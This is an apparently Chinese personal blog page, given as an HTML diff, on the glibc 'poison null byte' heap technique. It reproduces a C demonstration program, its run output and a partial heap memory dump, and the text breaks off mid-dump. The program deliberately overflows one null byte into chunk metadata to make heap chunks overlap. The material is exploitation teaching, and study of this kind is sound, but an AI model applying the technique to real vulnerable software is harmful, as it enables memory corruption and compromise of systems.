@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>  
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&amp;#123;	fprintf(stderr, &quot;Welco">
+<meta property="og:type" content="article">
+<meta property="og:title" content="7.posion_null_byte">
+<meta property="og:url" content="http://yoursite.com/2019/03/01/7.posion_null_byte/index.html">
+<meta property="og:site_name" content="ha2&#39;s blog">
+<meta property="og:description" content="0x00123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&amp;#123;	fprintf(stderr, &quot;Welco">
+<meta property="article:published_time" content="2019-02-28T16:00:07.000Z">
+<meta property="article:modified_time" content="2021-09-19T05:52:54.000Z">
+<meta property="article:author" content="ha2">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/01/7.posion_null_byte/"/>
+
+
+
+
+
+  <title>7.posion_null_byte | ha2's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ha2's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">（٩（๑>◡<๑）۶）</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/7.posion_null_byte/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ha2">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha2's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">7.posion_null_byte</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T00:00:07+08:00">
+                2019-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to poison null byte 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* a;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b;</span><br><span class="line">	<span class="keyword">uint8_t</span>* c;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b1;</span><br><span class="line">	<span class="keyword">uint8_t</span>* b2;</span><br><span class="line">	<span class="keyword">uint8_t</span>* d;</span><br><span class="line">	<span class="keyword">void</span> *barrier;</span><br></pre></td></tr></table></figure>
+<p>接上<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate 0x100 bytes for 'a'.\n"</span>);</span><br><span class="line">	a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"a: %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span></span><br><span class="line">		<span class="string">"(it may be more than 0x100 because of rounding): %#x\n"</span>, real_a_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment">	 * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment">	 * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line">		<span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line">		<span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line">		<span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line">		<span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line">		<span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Welcome</span> <span class="selector-tag">to</span> <span class="selector-tag">poison</span> <span class="selector-tag">null</span> <span class="selector-tag">byte</span> <span class="selector-tag">2</span><span class="selector-class">.0</span>!</span><br><span class="line"><span class="selector-tag">Tested</span> <span class="selector-tag">in</span> <span class="selector-tag">Ubuntu</span> <span class="selector-tag">14</span><span class="selector-class">.04</span> <span class="selector-tag">64bit</span>.</span><br><span class="line"><span class="selector-tag">This</span> <span class="selector-tag">technique</span> <span class="selector-tag">only</span> <span class="selector-tag">works</span> <span class="selector-tag">with</span> <span class="selector-tag">disabled</span> <span class="selector-tag">tcache-option</span> <span class="selector-tag">for</span> <span class="selector-tag">glibc</span>, <span class="selector-tag">see</span> <span class="selector-tag">build_glibc</span><span class="selector-class">.sh</span> <span class="selector-tag">for</span> <span class="selector-tag">build</span> <span class="selector-tag">instructions</span>.</span><br><span class="line"><span class="selector-tag">This</span> <span class="selector-tag">technique</span> <span class="selector-tag">can</span> <span class="selector-tag">be</span> <span class="selector-tag">used</span> <span class="keyword">when</span> you have an off-by-one into a malloc'ed region with a null byte.</span><br><span class="line">We allocate <span class="number">0</span>x100 bytes for <span class="string">'a'</span>.</span><br><span class="line"><span class="attribute">a</span>: <span class="number">0</span>x603010</span><br><span class="line">Since we want to overflow <span class="string">'a'</span>, we need to know the <span class="string">'real'</span> size of <span class="string">'a'</span> (it may be more than <span class="number">0</span>x100 because of rounding): <span class="number">0</span>x108</span><br><span class="line"><span class="attribute">b</span>: <span class="number">0</span>x603120</span><br><span class="line"><span class="attribute">c</span>: <span class="number">0</span>x603330</span><br><span class="line">We allocate a barrier at <span class="number">0</span>x603440, so that c is <span class="keyword">not</span> consolidated with the top-chunk <span class="keyword">when</span> freed.</span><br><span class="line">The barrier is <span class="keyword">not</span> strictly necessary, but makes things less confusing</span><br><span class="line">In newer versions of glibc we will need to have our updated size inside b itself to pass the check <span class="string">'chunksize(P) != prev_size (next_chunk(P))'</span></span><br><span class="line">b.<span class="attribute">size</span>: <span class="number">0</span>x211</span><br><span class="line">b.size <span class="attribute">is</span>: (<span class="number">0</span>x200 + <span class="number">0</span>x10) | prev_in_use</span><br><span class="line">We overflow <span class="string">'a'</span> with a single null byte into the metadata of <span class="string">'b'</span></span><br><span class="line">b.<span class="attribute">size</span>: <span class="number">0</span>x200</span><br><span class="line">c.prev_size is <span class="number">0</span>x210</span><br><span class="line">We will pass the check since chunksize(P) == <span class="number">0</span>x200 == <span class="number">0</span>x200 == prev_size (next_chunk(P))</span><br><span class="line"><span class="attribute">b1</span>: <span class="number">0</span>x603120</span><br><span class="line">Now we malloc <span class="string">'b1'</span>. It will be placed where <span class="string">'b'</span> was. At this point c.prev_size should have been updated, but it was <span class="keyword">not</span>: <span class="number">0</span>x210</span><br><span class="line">Interestingly, the updated value of c.prev_size has been written <span class="number">0</span>x10 bytes before c.<span class="attribute">prev_size</span>: f0</span><br><span class="line">We malloc <span class="string">'b2'</span>, our <span class="string">'victim'</span> chunk.</span><br><span class="line"><span class="attribute">b2</span>: <span class="number">0</span>x603230</span><br><span class="line">Current b2 <span class="attribute">content</span>:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Now we free <span class="string">'b1'</span> <span class="keyword">and</span> <span class="string">'c'</span>: this will consolidate the chunks <span class="string">'b1'</span> <span class="keyword">and</span> <span class="string">'c'</span> (forgetting about <span class="string">'b2'</span>).</span><br><span class="line">Finally, we allocate <span class="string">'d'</span>, overlapping <span class="string">'b2'</span>.</span><br><span class="line"><span class="attribute">d</span>: <span class="number">0</span>x603120</span><br><span class="line">Now <span class="string">'d'</span> <span class="keyword">and</span> <span class="string">'b2'</span> overlap.</span><br><span class="line">New b2 <span class="attribute">content</span>:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">Thanks to <span class="attribute">https</span>:<span class="comment">//www.contextis.com/resources/white-papers/glibc</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">a = malloc(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108</span></span><br><span class="line">b = malloc(<span class="number">0x200</span>);</span><br><span class="line">c = malloc(<span class="number">0x100</span>);</span><br><span class="line">barrier =  malloc(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//barrier的作用是防止c被释放的时候跟top_chunk合并在一起了。</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span>      &lt;=chunk_a</span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x6030e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000211</span>      &lt;=chunk_b</span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x6032f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span 